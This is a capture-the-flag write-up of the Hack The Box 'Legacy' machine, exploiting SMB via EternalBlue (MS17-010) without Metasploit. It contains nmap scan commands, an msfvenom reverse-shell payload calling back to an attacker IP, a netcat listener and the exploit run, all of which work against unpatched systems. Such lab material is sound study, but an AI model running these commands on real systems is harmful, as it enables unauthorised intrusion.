# Legacy Writeup w/o Metasploit

![](https://miro.medium.com/max/587/1*lTQ336Aj68RUNHuYjdCE5A.png)

## Reconnaissance <a id="3ccd"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA nmap/initial 10.10.10.4
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _nmap/initial_

We get back the following result showing that these ports are open:

* **Port 139:** running Microsoft Windows netbiois-ssn.
* **Port 445:** running Windows XP microsoft-ds.

![](https://miro.medium.com/max/1088/1*IUyh9A6LTMxxHZFDqLDJ-A.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA nmap/full 10.10.10.4
```

We get back the following result. No other ports are open.

![](https://miro.medium.com/max/1089/1*eVcfYf1UYWWYSuLHPm1lWw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA nmap/udp 10.10.10.4
```

We get back the following result. As can be seen, port 137 is open with netbios-ns running on it.

![](https://miro.medium.com/max/842/1*6Z85NaGdaLut4D_mPXlvow.png)

Our initial recon shows that the only point of entry is possibly through exploiting SMB.

## Enumeration <a id="3248"></a>

SMB has had its fair share of vulnerabilities in the past, so let’s first run nmap scripts to determine if it is vulnerable.

```text
nmap -v -script smb-vuln* -p 139,445 10.10.10.4
```

![](https://miro.medium.com/max/1032/1*QDuJY0ngDs-8FdgrNYBaaA.png)

The result shows us that it is vulnerable to CVE-2009–3103 and CVE-2017–0143 and likely vulnerable to CVE-2008–4250. The target machine is running SMBv1 so we’ll go with CVE-2017–0143 \(MS17–010\).

## Exploitation <a id="d6e0"></a>

The vulnerability we’ll be exploiting is called Eternal Blue. This vulnerability exploited Microsoft’s implementation of the Server Message Block \(SMB\) protocol, where if an attacker sent a specially crafted packet, the attacker would be allowed to execute arbitrary code on the target machine.

I came across this [article](https://ethicalhackingguru.com/how-to-exploit-ms17-010-eternal-blue-without-metasploit/) that explains how to exploit the Eternal Blue vulnerability without using Metasploit. We’ll use it to run the exploit on the target machine.

First, download the exploit code from Github.

```text
git clone https://github.com/helviojunior/MS17-010.git
```

Use MSFvenom to create a reverse shell payload \(allowed on the OSCP as long as you’re not using meterpreter\).

```text
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f exe > eternalblue.exe
```

Start up a listener on your attack machine.

```text
nc -nlvp 4444
```

Run the exploit.

```text
python send_and_execute.py 10.10.10.4 ~/Desktop/eternalblue.exe
```

![](https://miro.medium.com/max/922/1*Alda1JRD2rRuYdtVQebetA.png)

We have a reverse shell!

![](https://miro.medium.com/max/605/1*2gHkz5wfmvtdHyQK-y9gLw.png)

Next, we need to figure out what privileges we are running with.

![](https://miro.medium.com/max/642/1*TluyrrJPkLZVsMGFglzNUg.png)

**Whoami** doesn’t seem to work and we can’t echo the username. Therefore, we’ll have to get creative. Kali has a **whoami** executable that we can import to our target machine.

![](https://miro.medium.com/max/758/1*Ojfn655VnEMs4Fv1qEnbFQ.png)

Both netcat and powershell are not installed on the target machine, so we can’t use them to import the executable. Therefore, let’s try and setup an SMB server for the transfer.

Locate the SMB server script on kali.

![](https://miro.medium.com/max/609/1*qgbBM40SQzWr8k7xvCKHug.png)

Run the script to launch an SMB server on port 445 with the share name _temp_ and the path to the whoami executable.

```text
sudo /usr/share/doc/python-impacket/examples/smbserver.py temp /usr/share/windows-binaries/
```

![](https://miro.medium.com/max/955/1*xNqDs4gYn8apG5g6E2R1Sw.png)

Verify that script ran correctly by accessing the SMB share.

```text
smbclient //10.10.14.6/temp
```

List the content of the directory.

![](https://miro.medium.com/max/819/1*BLx78KtaOD7QV8G-_5mObQ.png)

In the target machine, you can now execute the whoami command using the temp share.

```text
\\10.10.14.6\temp\whoami.exe
```

![](https://miro.medium.com/max/541/1*usNmdlrHuOjrDx_BxFqmTg.png)

We have SYSTEM! We don’t need to escalate privileges for this box.

Grab the user flag.

![](https://miro.medium.com/max/645/1*GNs8Y_VHjws5cZz9ka8iKA.png)

Grab the root flag.

![](https://miro.medium.com/max/649/1*tW2RsJnMZIsDozzq6WIm1w.png)

## Lessons Learned <a id="a30a"></a>

This was a relatively simple machine to solve. It was running a vulnerable outdated version of SMB. So far, I’ve solved four machine and each one of them required me to exploit a vulnerable version of some software to either gain a foothold on the machine or to escalate privileges. So it goes without saying that you should always update your systems **especially** when updates are released for critical vulnerabilities! If the user had installed the MS17–010 security update, I would have had to find another way to exploit this machine.

